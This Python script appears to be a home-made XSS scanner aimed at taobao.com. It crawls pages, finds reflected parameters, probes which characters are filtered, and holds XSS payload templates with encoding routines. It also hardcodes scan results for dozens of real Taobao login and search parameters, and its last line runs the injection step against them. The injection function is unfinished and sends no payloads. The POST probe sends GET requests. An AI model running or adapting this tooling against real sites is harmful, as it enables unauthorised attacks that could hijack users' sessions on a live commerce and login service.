#!/usr/bin/python
from bs4 import BeautifulSoup as bs
from urllib.parse import urlsplit
from urllib.parse import urljoin
import requests
import binascii
import random
import string
import re
import os
import sys

#url = 'http://127.0.0.1:8000/xss-example/';
#allow_domain = '127.0.0.1'

url = 'https://www.taobao.com/'
allow_domain = 'taobao.com'

common_payload = (
    r'{(">|"/>|</[TAGNAME]>}<embed{/}[RND]src=[EVAL]>',
    r'{(">|"/>|</[TAGNAME]>}<svg{/}[RND]onload=[EVAL]>',
    r'{">|"/>|</[TAGNAME]>}<style{/}[RND]onload=[EVAL]>',
    r'{">|"/>|</[TAGNAME]>}<marquee{/}[RND]onstart=[EVAL]>',
    r'{">|"/>|</[TAGNAME]>}<object{/}[RND](data|onerror)=[EVAL]>',
    r'{">|"/>|</[TAGNAME]>}<iframe{/}[RND]src=(EVAL|[RND])onload=[EVAL])>',
    r'{">|"/>|</[TAGNAME]>}<(video|audio){/}[RND]src=[RND]onerror=[EVAL]>',
    r'{">|"/>|</[TAGNAME]>}<a{/}[RND](href|onmousemove|onmouseover|onclick)=[EVAL]>',
    r'{">|"/>|</[TAGNAME]>}<body{/}[RND](onload|background|onerror|onclick)=[EVAL]>',
    r'{">|"/>|</[TAGNAME]>}<var{/}[RND](onmousemove|onmouseover|onclick)=[EVAL]>[RND]',
    r'{">|"/>|</[TAGNAME]>}<script[RND]>[RND](src|onerror)=[EVAL]>[EVAL]</script[RND]>',
    r'{">|"/>|</[TAGNAME]>}<(div|span|a|[LETTER]){/}[RND](onmousemove|onmouseover|onclick)=[EVAL]>[RND]',
    r'{">|"/>|</[TAGNAME]>}<(img|image){/}[RND]src=(EVAL|[RND])(onerror|onmouseover|onmousemove|onclick)=[EVAL]>',
    r'{">|"/>|</[TAGNAME]>}<(select|textarea|input|keygen){/}[RND]autofocus(onfocus|onmousemove|onmouseover|onclick)=[EVAL]>'
)


event_payload = (
    r'{/}(onload|onstart|onerror|onmousemove|onmouseover|onclick|background|src|onfocus|data|)=[EVAL]{//}'
)

js_payload = (
    r'{javascript:}alert`0`',
    r'{javascript:}prompt`0`',
    r'{javascript:}confirm`0`',
    r'{javascript:}alert(0)',
    r'{javascript:}prompt(0)',
    r'{javascript:}confirm(0)',
)


def get_dynamic_links_url(murl):
    '''
    Read dynamic links from url, only GET
    '''
    url_links = list()
    ignore = dict()
    visited = dict()
    response = requests.get(murl)
    html = bs(response.text,'html.parser')
    a = html.find_all(name='a',attrs={'href':True})
    for el in a:
        parse = urlsplit(el['href'])
        query = parse[3]
        host = murl.split('//',1)[1].split('/',1)[0]
        dirname = os.path.dirname(murl.split('//',1)[1].split('/',1)[1])
        if el['href'].startswith('http'):
            url = el['href']
        elif el['href'].startswith('//'):
            url = murl.split('//',1)[0] + el['href']
        elif el['href'].startswith('/'):
            url = murl.split('//',1)[0] + '//' + host + el['href']
        else:
            if el['href'].startswith('javascript:'):
                continue
        url = urljoin(murl,el['href'])
        rawurl = requests.get(url, allow_redirects=True).url
        url = rawurl.replace('//','/').replace('/','//',1)
        if url.find('?') != -1:
            url = url.split('?')[0]
        host = url.split('//',1)[1].split('/',1)[0]
        if host.find(allow_domain) == -1:
            continue
        qlist = dict()
        if query:
            if query.find('&') != -1:
                for q in query.split('&'):
                    if q.find('=') != -1:
                        qlist[q.split('=',1)[0]] = q.split('=',1)[1]
            else:
                if query.find('=') != -1:
                    qlist[query.split('=',1)[0]] = query.split('=',1)[1]
            for k,_ in qlist.items():
                if not host in visited:
                    visited[host] = list()
                if k in visited[host]:
                    continue
                else:
                    visited[host].append(k)
                if k in ignore:
                    if ignore[k] == 3:
                        print(k,'ignore')
                        continue
                rnd = ''.join(random.sample(string.ascii_letters,8))
                fuzz = qlist.copy()
                fuzz[k] = rnd
                response = requests.get(url,params=fuzz)
                if response.text.find(rnd) != -1:
                    print(k,'is dynamic')
                    fuzz.pop(k)
                    item = dict()
                    item['url'] = url
                    item['method'] = 'get'
                    item['param'] = k
                    item['raw'] = fuzz
                    url_links.append(item)
                else:
                    print(k,'not dynamic')
                    if not k in ignore:
                        ignore[k] = 1
                    ignore[k] += 1
    return url_links


def get_dynamic_links_rest(murl):
    '''
    Read dynamic links from REST url, only GET
    '''
    pass


def get_dynamic_links_form(murl):
    '''
    Read dynmaic links from form, GET and POST
    '''
    form_links = list()
    response = requests.get(murl)
    html = bs(response.text,'html.parser')
    form = html.find_all(name='form', attrs={'action':True})
    for f in form:
        parse = urlsplit(f['action'])
        query = parse[3]
        host = murl.split('//',1)[1].split('/',1)[0]
        dirname = os.path.dirname(murl.split('//',1)[1].split('/',1)[1])
        if f['action'].startswith('http'):
            url = f['action']
        elif f['action'].startswith('//'):
            url = murl.split('//',1)[0] + f['action']
        elif f['action'].startswith('/'):
            url = murl.split('//',1)[0] + '//' + host + f['action']
        else:
            url = urljoin(murl,f['action'])
        url = url.replace('//','/').replace('/','//',1)
        host = url.split('//',1)[1].split('/',1)[0]
        if host.find(allow_domain) == -1:
            continue
        tags = f.find_all(name='input')
        if f.has_attr('method'):
            method = f['method']
        else:
            method = 'get'
        print('action:',url)
        print('method:',method)
        item = dict()
        item['url'] = url
        item['method'] = method
        count = 1
        data = dict(zip([el['name'] for el in tags],[''.join(random.sample(string.ascii_letters,8)) for _ in tags]))
        if method == 'get':
            response = requests.get(url,params=data)
        else:
            response = requests.post(url,data=data)
        for k,v in data.items():
            if response.text.find(v) != -1:
                print(k,'is dynamic')
                item['param' + str(count)] = k
                count += 1
            else:
                print(k,'not dynamic')
        if 'param1' in item:
            form_links.append(item)
    return form_links


def get_output_position(links):
    '''
    Get the output position
    '''
    plinks = list()
    for item in links:
        url = item['url']
        method = item['method']
        keys = list(item.keys())
        params = list()
        israw = False
        if 'raw' in item:
            raw = item['raw']
            israw = True
        for k in keys:
            if k.startswith('param'):
                params.append(item[k])
        fuzz = dict(zip(params,[''.join(random.sample(string.ascii_letters,8)) for _ in params]))
        if method == 'get':
            response = requests.get(url,params=fuzz)
        else:
            response = requests.post(url,data=fuzz)
        for p,r in fuzz.items():
            regex_rnd = r'.*{0}.*'.format(r)
            regex_tags = r'\<.*\>.*?{0}.*?\<\/.*\>'.format(r)
            regex_attrs = r'\<.*\=\".*{0}.*\".*\>'.format(r)
            position = re.findall(regex_rnd,response.text)
            kk = list(item.keys())[list(item.values()).index(p)]
            if len(kk) != 5:
                n = kk.replace('param','')
                name = 'pos' + str(n)
            else:
                name = 'pos'
            item[name] = list()
            for pos in position:
                if re.findall(regex_tags,pos):
                    if 'tags' not in item[name]:
                        item[name].append('tags')
                        print(p,'output between tags')
                elif re.findall(regex_attrs,pos):
                    if 'attrs' not in item[name]:
                        item[name].append('attrs')
                        print(p,'output in tags')
                else:
                    if 'page' not in item[name]:
                        item[name].append('page')
                        print(p,'output on the page')
        plinks.append(item)
    return plinks

def get_xss_filter(links):
    '''
    Find filtered keyword
    '''
    symbols = '<>`\\\'\"'
    xlinks = list()
    for item in links:
        url = item['url']
        method = item['method']
        keys = list(item.keys())
        params = list()
        israw = False
        if 'raw' in item:
            raw = item['raw']
            israw = True
        for k in keys:
            if k.startswith('param'):
                params.append(item[k])
        for p in params:
            fuzz = dict()
            allowed = list()
            for pp in params:
                if pp != p:
                    fuzz[pp] = ''.join(random.sample(string.ascii_letters,8))
            for s in symbols:
                rnd = ''.join(random.sample(string.ascii_letters,8))
                fuzz[p] = rnd + s + rnd
                if israw:
                    merge = dict()
                    merge.update(fuzz)
                    merge.update(raw)
                else:
                    merge = fuzz.copy()
                if method == 'get':
                    response = requests.get(url,params=merge)
                else:
                    response = requests.get(url,params=merge)
                keyword = re.findall(r'(?<={0})(.*)?(?={1})'.format(rnd,rnd),response.text)
                if keyword:
                    for w in keyword:
                        if w == s:
                            allowed.append(s)
            kk = list(item.keys())[list(item.values()).index(p)]
            if len(kk) != 5:
                n = kk.replace('param','')
                name = 'filtered' + str(n)
            else:
                name = 'filtered'
            if len(allowed) == len(symbols):
                item[name] = 'null'
                print(p,'allowed all symbols')
            else:
                filtered = ','.join(a for a in symbols if a not in allowed)
                item[name] = filtered
                print(p,filtered,'filtered')
        xlinks.append(item)
    return xlinks


def encode_xss_payload(payload,entype):
    '''
    Encode xss payload
    '''
    if entype == 'uni':
        uni_p = ''
        for p in payload:
            uni_p += r'\u00' + binascii.hexlify(p.encode('unicode-escape')).decode()
        return uni_p
    elif entype == 'hex':
        hex_p = ''
        for p in payload:
            hex_p += '&#x00' + binascii.hexlify(p.encode('unicode-escape')).decode() + ';'
        return hex_p
    elif entype == 'dec':
        dec_p = ''
        for p in payload:
            dec_p += '&#' + str(ord(p)) + ';'
        return dec_p
    else:
        asc_p = list()
        for p in payload:
            asc_p.append(str(ord(p)))
        asc_p = 'eval(String.FromCharCode(' + ','.join(asc_p) + '))'
        return asc_p


def inject_xss_payload(links):
    '''
    Testing XSS vul
    '''
    for item in links:
        url = item['url']
        method = item['method']
        keys = list(item.keys())
        params = list()
        pos = list()
        filtered = list()
        israw = False
        if 'raw' in item:
            raw = item['raw']
            israw = True
        for k in keys:
            if k.startswith('param'):
                params.append(item[k])
            if k.startswith('pos'):
                pos.append(item[k])
            if k.startswith('filtered'):
                filtered.append(item[k])
        for p in params:
            kk = list(item.keys())[list(item.values()).index(p)]
            if len(kk) != 5:
                n = kk.replace('param','')
                ppos = item['pos' + str(n)]
                pfiltered = item['filtered' + str(n)]
            else:
                ppos = item['pos']
                pfiltered = item['filtered']
            if not pfiltered:
                print(p,'may be xss vul')
            rnd = ''.join(random.sample(string.ascii_letters,8))
            fuzz = dict()
            fuzz[p] = rnd
            if israw:
                fuzz.update(raw)
            if method == 'get':
                response = requests.get(url,params=fuzz)
            else:
                response = requests.post(url,data=fuzz)
            tagname = list()
            attrname = list()
            regex_tagname = r'(?<=\<)(.*?)(?=\>.*?{0}.*?)'.format(rnd)
            regex_attrname = r'(?<=\<)(.*?)(?=\s.*?{0})'.format(rnd)
            if 'tags' in ppos:
                tagname += re.findall(regex_tagname,response.text)
            if 'attrs' in ppos:
                attrname += re.findall(regex_attrname,response.text)


xlinks1 = [{
    'url': 'https://login.taobao.com/member/login.jhtml',
    'raw': {
        'redirectURL': 'https%3A%2F%2Fwww.taobao.com%2F'
    },
    'pos': ['attrs'],
    'param': 'f',
    'method': 'get',
    'filtered': '<,>,\',"'
}, {
    'url': 'https://login.taobao.com/member/login.jhtml',
    'raw': {
        'f': 'top'
    },
    'pos': ['attrs'],
    'param': 'redirectURL',
    'method': 'get',
    'filtered': '<,>,\',"'
}, {
    'url': 'https://login.taobao.com/member/login.jhtml',
    'raw': {
        'ad_id': '',
        'am_id': '',
        'cm_id': '',
        'from': 'mini'
    },
    'pos': ['attrs'],
    'param': 'pm_id',
    'method': 'get',
    'filtered': '<,>,\',"'
}, {
    'url': 'https://login.taobao.com/member/login.jhtml',
    'raw': {
        'ad_id': '',
        'am_id': '',
        'pm_id': '1501036000a02c5c3739',
        'from': 'mini'
    },
    'pos': ['attrs'],
    'param': 'cm_id',
    'method': 'get',
    'filtered': '<,>,\',"'
}, {
    'url': 'https://login.taobao.com/member/login.jhtml',
    'raw': {
        'ad_id': '',
        'cm_id': '',
        'pm_id': '1501036000a02c5c3739',
        'from': 'mini'
    },
    'pos': ['attrs'],
    'param': 'am_id',
    'method': 'get',
    'filtered': '<,>,\',"'
}, {
    'url': 'https://login.taobao.com/member/login.jhtml',
    'raw': {
        'am_id': '',
        'cm_id': '',
        'pm_id': '1501036000a02c5c3739',
        'from': 'mini'
    },
    'pos': ['attrs'],
    'param': 'ad_id',
    'method': 'get',
    'filtered': '<,>,\',"'
}, {
    'url': 'https://login.taobao.com/member/login.jhtml',
    'raw': {
        'ad_id': '',
        'am_id': '',
        'cm_id': '',
        'pm_id': '1501036000a02c5c3739'
    },
    'pos': ['page', 'attrs'],
    'param': 'from',
    'method': 'get',
    'filtered': '<,>,\',"'
}, {
    'url': 'https://fuwu.taobao.com/',
    'raw': {},
    'pos': ['attrs', 'page'],
    'param': 'tracelog',
    'method': 'get',
    'filtered': '<,>,`,\\,\',"'
}, {
    'url': 'https://s.taobao.com/search',
    'raw': {
        'style': 'grid',
        'source': 'tbsy',
        'q': '连衣裙',
        'refpid': '420460_1006',
        'pvid': 'd0f2ec2810bcec0d5a16d5283ce59f66',
        'spm': '1.7274553.1997520241-2.2.TpEKPQ'
    },
    'pos': ['page'],
    'param': 'tab',
    'method': 'get',
    'filtered': '<,>,`,\\,\',"'
}, {
    'url': 'https://s.taobao.com/search',
    'raw': {
        'source': 'tbsy',
        'q': '连衣裙',
        'tab': 'all',
        'refpid': '420460_1006',
        'spm': '1.7274553.1997520241-2.2.TpEKPQ',
        'pvid': 'd0f2ec2810bcec0d5a16d5283ce59f66'
    },
    'pos': ['page'],
    'param': 'style',
    'method': 'get',
    'filtered': '<,>,`,\\,\',"'
}, {
    'url': 'https://s.taobao.com/search',
    'raw': {
        'source': 'tbsy',
        'q': '连衣裙',
        'tab': 'all',
        'refpid': '420460_1006',
        'style': 'grid',
        'spm': '1.7274553.1997520241-2.2.TpEKPQ'
    },
    'pos': ['page'],
    'param': 'pvid',
    'method': 'get',
    'filtered': '<,>,`,\\,\',"'
}, {
    'url': 'https://s.taobao.com/search',
    'raw': {
        'style': 'grid',
        'q': '连衣裙',
        'tab': 'all',
        'refpid': '420460_1006',
        'spm': '1.7274553.1997520241-2.2.TpEKPQ',
        'pvid': 'd0f2ec2810bcec0d5a16d5283ce59f66'
    },
    'pos': ['page'],
    'param': 'source',
    'method': 'get',
    'filtered': '<,>,`,\\,\',"'
}, {
    'url': 'https://s.taobao.com/search',
    'raw': {
        'source': 'tbsy',
        'q': '连衣裙',
        'tab': 'all',
        'refpid': '420460_1006',
        'style': 'grid',
        'pvid': 'd0f2ec2810bcec0d5a16d5283ce59f66'
    },
    'pos': ['page'],
    'param': 'spm',
    'method': 'get',
    'filtered': '<,>,`,\\,\',"'
}, {
    'url': 'https://s.taobao.com/search',
    'raw': {
        'style': 'grid',
        'source': 'tbsy',
        'q': '连衣裙',
        'tab': 'all',
        'pvid': 'd0f2ec2810bcec0d5a16d5283ce59f66',
        'spm': '1.7274553.1997520241-2.2.TpEKPQ'
    },
    'pos': ['page'],
    'param': 'refpid',
    'method': 'get',
    'filtered': '<,>,`,\\,\',"'
}, {
    'url': 'https://s.taobao.com/search',
    'raw': {
        'spm': '1.7274553.1997520241-2.2.TpEKPQ',
        'source': 'tbsy',
        'tab': 'all',
        'refpid': '420460_1006',
        'style': 'grid',
        'pvid': 'd0f2ec2810bcec0d5a16d5283ce59f66'
    },
    'pos': ['attrs', 'tags', 'page'],
    'param': 'q',
    'method': 'get',
    'filtered': '<,>,\\,\',"'
}, {
    'url': 'https://s.taobao.com/search',
    'raw': {
        'q': '%E7%BE%8E%E9%A3%9F',
        'initiative_id': 'staobaoz_20180724',
        'ie': 'utf8',
        'imgfile': '',
        'stats_click': 'search_radio_all%3A1'
    },
    'pos': ['page'],
    'param': 'js',
    'method': 'get',
    'filtered': '<,>,`,\\,\',"'
}, {
    'url': 'https://s.taobao.com/search',
    'raw': {
        'q': '%E7%BE%8E%E9%A3%9F',
        'ie': 'utf8',
        'js': '1',
        'imgfile': '',
        'stats_click': 'search_radio_all%3A1'
    },
    'pos': ['page'],
    'param': 'initiative_id',
    'method': 'get',
    'filtered': '<,>,`,\\,\',"'
}, {
    'url': 'https://s.taobao.com/search',
    'raw': {
        'q': '%E7%BE%8E%E9%A3%9F',
        'initiative_id': 'staobaoz_20180724',
        'ie': 'utf8',
        'js': '1',
        'stats_click': 'search_radio_all%3A1'
    },
    'pos': ['page'],
    'param': 'imgfile',
    'method': 'get',
    'filtered': '<,>,`,\\,\',"'
}, {
    'url': 'https://s.taobao.com/search',
    'raw': {
        'q': '%E7%BE%8E%E9%A3%9F',
        'initiative_id': 'staobaoz_20180724',
        'js': '1',
        'imgfile': '',
        'stats_click': 'search_radio_all%3A1'
    },
    'pos': ['page'],
    'param': 'ie',
    'method': 'get',
    'filtered': '<,>,`,\\,\',"'
}, {
    'url': 'https://s.taobao.com/search',
    'raw': {
        'q': '%E7%BE%8E%E9%A3%9F',
        'initiative_id': 'staobaoz_20180724',
        'ie': 'utf8',
        'js': '1',
        'imgfile': ''
    },
    'pos': ['page'],
    'param': 'stats_click',
    'method': 'get',
    'filtered': '<,>,`,\\,\',"'
}, {
    'url': 'https://s.taobao.com/search',
    'raw': {
        'initiative_id': 'staobaoz_20180724',
        'wq': '%E7%94%9F%E9%B2%9C',
        'ie': 'utf8',
        'js': '1',
        'suggest_query': '%E7%94%9F%E9%B2%9C',
        'imgfile': '',
        'source': 'suggest',
        'q': '%E7%94%9F%E9%B2%9C',
        '_input_charset': 'utf-8',
        'stats_click': 'search_radio_all%3A1'
    },
    'pos': ['page'],
    'param': 'suggest',
    'method': 'get',
    'filtered': '<,>,`,\\,\',"'
}, {
    'url': 'https://s.taobao.com/search',
    'raw': {
        'initiative_id': 'staobaoz_20180724',
        'suggest': 'history_1',
        'ie': 'utf8',
        'js': '1',
        'suggest_query': '%E7%94%9F%E9%B2%9C',
        'imgfile': '',
        'source': 'suggest',
        'q': '%E7%94%9F%E9%B2%9C',
        '_input_charset': 'utf-8',
        'stats_click': 'search_radio_all%3A1'
    },
    'pos': ['page'],
    'param': 'wq',
    'method': 'get',
    'filtered': '<,>,`,\\,\',"'
}, {
    'url': 'https://s.taobao.com/search',
    'raw': {
        'initiative_id': 'staobaoz_20180724',
        'wq': '%E7%94%9F%E9%B2%9C',
        'ie': 'utf8',
        'js': '1',
        'imgfile': '',
        'suggest': 'history_1',
        'q': '%E7%94%9F%E9%B2%9C',
        'source': 'suggest',
        '_input_charset': 'utf-8',
        'stats_click': 'search_radio_all%3A1'
    },
    'pos': ['page'],
    'param': 'suggest_query',
    'method': 'get',
    'filtered': '<,>,`,\\,\',"'
}, {
    'url': 'https://s.taobao.com/search',
    'raw': {
        'initiative_id': 'staobaoz_20180724',
        'wq': '%E7%94%9F%E9%B2%9C',
        'ie': 'utf8',
        'js': '1',
        'suggest_query': '%E7%94%9F%E9%B2%9C',
        'imgfile': '',
        'suggest': 'history_1',
        'q': '%E7%94%9F%E9%B2%9C',
        'source': 'suggest',
        'stats_click': 'search_radio_all%3A1'
    },
    'pos': ['page'],
    'param': '_input_charset',
    'method': 'get',
    'filtered': '<,>,`,\\,\',"'
}, {
    'url': 'https://s.taobao.com/search',
    'raw': {
        'initiative_id': 'tbindexz_20170306',
        'search_type': 'item',
        'ssid': 's5-e',
        'imgfile': '',
        'q': '%E9%9B%B6%E9%A3%9F',
        'spm': 'a21bo.2017.201856-taobao-item.1',
        'ie': 'utf8',
        'commend': 'all'
    },
    'pos': ['page'],
    'param': 'sourceId',
    'method': 'get',
    'filtered': '<,>,`,\\,\',"'
}, {
    'url': 'https://s.taobao.com/search',
    'raw': {
        'initiative_id': 'tbindexz_20170306',
        'ie': 'utf8',
        'ssid': 's5-e',
        'imgfile': '',
        'q': '%E9%9B%B6%E9%A3%9F',
        'spm': 'a21bo.2017.201856-taobao-item.1',
        'sourceId': 'tb.index',
        'commend': 'all'
    },
    'pos': ['page'],
    'param': 'search_type',
    'method': 'get',
    'filtered': '<,>,`,\\,\',"'
}, {
    'url': 'https://s.taobao.com/search',
    'raw': {
        'initiative_id': 'tbindexz_20170306',
        'search_type': 'item',
        'ssid': 's5-e',
        'imgfile': '',
        'q': '%E9%9B%B6%E9%A3%9F',
        'sourceId': 'tb.index',
        'ie': 'utf8',
        'spm': 'a21bo.2017.201856-taobao-item.1'
    },
    'pos': ['page'],
    'param': 'commend',
    'method': 'get',
    'filtered': '<,>,`,\\,\',"'
}, {
    'url': 'https://s.taobao.com/search',
    'raw': {
        'initiative_id': 'tbindexz_20170306',
        'search_type': 'item',
        'imgfile': '',
        'q': '%E9%9B%B6%E9%A3%9F',
        'spm': 'a21bo.2017.201856-taobao-item.1',
        'sourceId': 'tb.index',
        'ie': 'utf8',
        'commend': 'all'
    },
    'pos': ['page'],
    'param': 'ssid',
    'method': 'get',
    'filtered': '<,>,`,\\,\',"'
}, {
    'url': 'https://s.taobao.com/list',
    'raw': {
        'spm': 'a21bo.50862.201867-links-10.27.iQWRJS',
        'source': 'youjia'
    },
    'pos': ['page'],
    'param': 'cat',
    'method': 'get',
    'filtered': '<,>,`,\\,\',"'
}, {
    'url': 'https://s.taobao.com/list',
    'raw': {
        'bcoffset': '0',
        'spm': 'a21bo.50862.201867-links-11.80.K6jN68',
        'cat': '50008163',
        'source': 'youjia'
    },
    'pos': ['page'],
    'param': 's',
    'method': 'get',
    'filtered': '<,>,`,\\,\',"'
}, {
    'url': 'https://s.taobao.com/list',
    'raw': {
        'spm': 'a21bo.50862.201867-links-11.80.K6jN68',
        's': '240',
        'cat': '50008163',
        'source': 'youjia'
    },
    'pos': ['page'],
    'param': 'bcoffset',
    'method': 'get',
    'filtered': '<,>,`,\\,\',"'
}]

xlinks2 = [{
    'param6': 'ssid',
    'url': 'https://s.taobao.com/search',
    'pos9': ['page'],
    'pos1': ['page'],
    'filtered1': '<,>,`,\\,\',"',
    'param2': 'commend',
    'pos5': ['page'],
    'param4': 'initiative_id',
    'filtered5': '<,>,`,\\,\',"',
    'pos2': ['page'],
    'param9': 'sourceId',
    'filtered3': '<,>,`,\\,\',"',
    'filtered9': '<,>,`,\\,\',"',
    'filtered4': '<,>,`,\\,\',"',
    'pos3': ['page'],
    'filtered7': '<,>,`,\\,\',"',
    'filtered2': '<,>,`,\\,\',"',
    'param8': 'q',
    'filtered8': '<,>,\\,\',"',
    'filtered6': '<,>,`,\\,\',"',
    'param7': 'ie',
    'param5': 'imgfile',
    'pos7': ['page'],
    'method': 'get',
    'param3': 'search_type',
    'pos8': ['attrs', 'tags', 'page'],
    'pos6': ['page'],
    'param1': 'spm',
    'pos4': ['page']
}]

# ulinks = get_dynamic_links_url(url)
# flinks = get_dynamic_links_form(url)

# plinks1 = get_output_position(ulinks)
# plinks2 = get_output_position(flinks)

# xlinks1 = get_xss_filter(plinks1)
# xlinks2 = get_xss_filter(plinks2)

inject_xss_payload(xlinks1)
